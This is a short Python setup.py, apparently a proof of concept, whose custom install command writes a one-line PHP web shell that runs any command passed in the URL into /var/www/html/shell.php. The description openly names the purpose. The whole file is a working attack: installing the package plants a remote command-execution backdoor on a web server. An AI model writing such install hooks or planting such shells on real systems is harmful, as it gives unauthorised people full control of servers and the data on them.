import setuptools
from setuptools.command.install import install

class web_php_shell(install):
  def run(self):
    f=open("/var/www/html/shell.php","w")
    f.write("<?php system($_GET['cmd']) ?>")
    f.close()


setuptools.setup(
  name="webshell_write",
  author="u3k1",
  description="Write webshell to /var/www/html/",
  packages=setuptools.find_packages(),
  cmdclass={ "install": web_php_shell }
)
